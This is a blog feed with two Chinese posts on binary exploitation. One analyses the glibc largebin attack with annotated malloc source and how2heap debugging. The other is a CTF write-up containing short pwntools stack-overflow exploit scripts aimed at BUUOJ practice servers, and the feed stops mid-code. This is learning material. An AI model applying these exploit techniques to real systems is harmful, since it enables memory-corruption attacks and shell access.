<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Icey&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-03-28T08:26:43.637Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>1c3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Largebin attack学习</title>
    <link href="http://example.com/2021/03/28/Largebin%20attack%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/03/28/Largebin%20attack%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-03-28T06:10:00.000Z</published>
    <updated>2021-03-28T08:26:43.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Largebin分配流程概述"><a href="#Largebin分配流程概述" class="headerlink" title="Largebin分配流程概述"></a>Largebin分配流程概述</h1><ul><li>在一个chunk被插入unsorted bin后，当我们再去申请chunk时，会反向遍历unsorted bin的双向循环链表，如果没有匹配到合适的大小，则会将根据bin的大小，将其放置到对应的large bin或small bin</li><li>如果所需分配的chunk为largebin chunk，则会反向遍历largebin链表</li><li>找到第一个大于等于所需chunk大小的chunk退出循环</li><li>将其切分后判断其剩余大小，如果大于MINSIZE，则构成新的chunk放入unsorted bin中</li><li>largebin链表中chunk按从大到小排列</li></ul><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="宏bin-at"><a href="#宏bin-at" class="headerlink" title="宏bin_at"></a>宏bin_at</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))      \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure><p>宏bin_at(m,i)通过bin index获得bin的链表头</p><h2 id="largebin取出操作"><a href="#largebin取出操作" class="headerlink" title="largebin取出操作"></a>largebin取出操作</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;<span class="comment">//如果large bin链表为空或者其中最大的chunk也无法满足要求，则不能从large bin中分配</span></span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;<span class="comment">//此时victim的大小大于我们所需chunk，反向遍历链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="comment">//如果选取的chunk victim不是链表中的最后一个chunk，并且与victim大小相同的chunk不止一个，则申请此时堆头chunk的下一个</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;<span class="comment">//将victim进行切割</span></span><br><span class="line">              unlink (av, victim, bck, fwd);<span class="comment">//调用unlink()宏将victim从large bin中取出</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;<span class="comment">//如果victim切分后剩余大小小于MINSIZE，则将整个victim分配给应用层，这种情况下，实际分配的chunk比所需的chunk大一些</span></span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;<span class="comment">//如果剩余空间还可以构成chunk，则将其放入unsorted bin</span></span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd; <span class="comment">//fwd是unsorted bin第一个chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h2 id="largebin插入操作"><a href="#largebin插入操作" class="headerlink" title="largebin插入操作"></a>largebin插入操作</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;<span class="comment">//所需chunk不属于small bins，则一定属于large bins</span></span><br><span class="line">             <span class="comment">//根据chunk的大小获得对应large bin的index</span></span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);<span class="comment">//bck为large bin的链表头</span></span><br><span class="line">              fwd = bck-&gt;fd;<span class="comment">//链表首元结点</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;<span class="comment">//如果fwd不等于bck，则意味着large bin中有空闲chunk存在</span></span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//是否在主线程</span></span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;<span class="comment">//如果所需chunk比large bin的最后一个chunk大小还小，那么当前chunk就插入到large bin的链表的最后</span></span><br><span class="line">                      fwd = bck; <span class="comment">//此时fwd为链表表头</span></span><br><span class="line">                      bck = bck-&gt;bk; <span class="comment">//bck置为链表的最后一个chunk</span></span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;<span class="comment">//victim要插入到链表最后，那么比它小的就是链表的首元结点</span></span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//比它大的就是最小的那一个（双向链表的插入操作）</span></span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//完成插入操作，画个图就懂了</span></span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;<span class="comment">//正向遍历链表，直到找到第一个chunk大小小于等于当前chunk大小的chunk退出循环</span></span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        <span class="comment">//如果找到了大小相同的chunk</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;<span class="comment">//双向链表插入</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="comment">//唯一的chunk，也做成循环链表</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h1 id="how2heap源码调试"><a href="#how2heap源码调试" class="headerlink" title="how2heap源码调试"></a>how2heap源码调试</h1><p>先申请三个堆块和fastbin，防止free的时候与top chunk合并</p><p><img src="https://i.loli.net/2021/03/28/XPT4i62LBxmqjad.png"></p><p>接着释放p1和p2</p><p><img src="https://i.loli.net/2021/03/28/G1sFljKpOLEgXJW.png"></p><p>然后会申请一个0x90大小的chunk，根据上文源码分析可知，此时会将unsorted bin里的p1放入small bin，将p2放入large bin，由于我们申请的大小为0x90，会到small bin里找，将p1进行切割以满足0x90的要求，并剩余的大小（0x330-0xa0）放入unsorted bin里</p><p><img src="https://i.loli.net/2021/03/28/AD3xhykYF9Bwn1p.png"><br><img src="https://i.loli.net/2021/03/28/RXhSLcxeN39rf7D.png"></p><p>接下来修改p2:<br>|||<br>| —- | —- |<br>|previous chunk size| size=0x3f1 |<br>| fd=0 | bk=addr1 |<br>| fd_nextsize=0 | bk_nextsize=addr2 |</p><p>修改后：</p><p><img src="https://i.loli.net/2021/03/28/wzx1nrUfmpOvLW6.png"></p><p>此时再申请0x90的chunk，将size=0x291的chunk放入small bin，将size=0x411的chunk放入large bin<br>由于之前p2的大小被修改为0x3f1&lt;0x411，所以会执行下面的操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;<span class="comment">//双向链表插入</span></span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">bck = fwd-&gt;bk;                 &#125;</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">//--&gt;</span></span><br><span class="line">addr2-&gt;fd_nextsize = victim;</span><br><span class="line">*(addr2+<span class="number">4</span>) = victim;</span><br></pre></td></tr></table></figure><p>还有另一个利用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk = addr1 = bck</span><br><span class="line">bck-&gt;fd = victim</span><br><span class="line">addr1-&gt;fd = victim</span><br><span class="line"><span class="comment">//--&gt;</span></span><br><span class="line">*(addr1+<span class="number">2</span>) = victim</span><br></pre></td></tr></table></figure><h1 id="例题练习"><a href="#例题练习" class="headerlink" title="例题练习"></a>例题练习</h1><p>有空再做</p><h1 id="largebin-attack的利用方法"><a href="#largebin-attack的利用方法" class="headerlink" title="largebin attack的利用方法"></a>largebin attack的利用方法</h1><ul><li>可以修改一个 large bin chunk 的 data</li><li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Largebin分配流程概述&quot;&gt;&lt;a href=&quot;#Largebin分配流程概述&quot; class=&quot;headerlink&quot; title=&quot;Largebin分配流程概述&quot;&gt;&lt;/a&gt;Largebin分配流程概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;在一个chunk被插入unsor</summary>
      
    
    
    
    <category term="二进制漏洞" scheme="http://example.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="how2heap" scheme="http://example.com/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ刷题记录补档-1</title>
    <link href="http://example.com/2021/03/22/BUUOJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A31/"/>
    <id>http://example.com/2021/03/22/BUUOJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A31/</id>
    <published>2021-03-22T13:19:00.000Z</published>
    <updated>2021-03-22T15:40:01.878Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上学期和寒假刷了一些题，但是因为懒没有全部记录下，现在分几篇博客慢慢补上，也当作回顾<br>这篇的题应该都是很基础的，不详细写（偷懒）</p><h2 id="0x1-warmup-csaw-2016"><a href="#0x1-warmup-csaw-2016" class="headerlink" title="0x1 warmup_csaw_2016"></a>0x1 warmup_csaw_2016</h2><p>常规栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;27790&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x40060d</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>) + p64(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2-pwn1-sctf-2016"><a href="#0x2-pwn1-sctf-2016" class="headerlink" title="0x2 pwn1_sctf_2016"></a>0x2 pwn1_sctf_2016</h2><p>ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;29973&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x08048F0D</span></span><br><span class="line">payload = <span class="string">&#x27;I&#x27;</span>*<span class="number">20</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x3-ciscn-2019-n-1"><a href="#0x3-ciscn-2019-n-1" class="headerlink" title="0x3 ciscn_2019_n_1"></a>0x3 ciscn_2019_n_1</h2><p>溢出到v2，把v2改成11.28125，这里要用11.28125在内存中的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;27563&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x5</span>+<span class="number">1</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x4-jarvisoj-level0"><a href="#0x4-jarvisoj-level0" class="headerlink" title="0x4 jarvisoj_level0"></a>0x4 jarvisoj_level0</h2><p>ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;26488&#x27;</span>)</span><br><span class="line">binsh = <span class="number">0x0400596</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(binsh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x5-ciscn-2019-c-1"><a href="#0x5-ciscn-2019-c-1" class="headerlink" title="0x5 ciscn_2019_c_1"></a>0x5 ciscn_2019_c_1</h2><p>ret2libc，当时做这种题可把我坑苦了，后来深入理解函数栈的调用和64位系统通过寄存器传参后就好了<br>重点还是从汇编角度来理解，做题的时候已经变成一种模板了</p><h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE                            hh      iii                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>);</span><br><span class="line">  begin();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fflush(<span class="number">0LL</span>);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">      begin();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    encrypt();</span><br><span class="line">    begin();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p>重点在encrypt处：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span 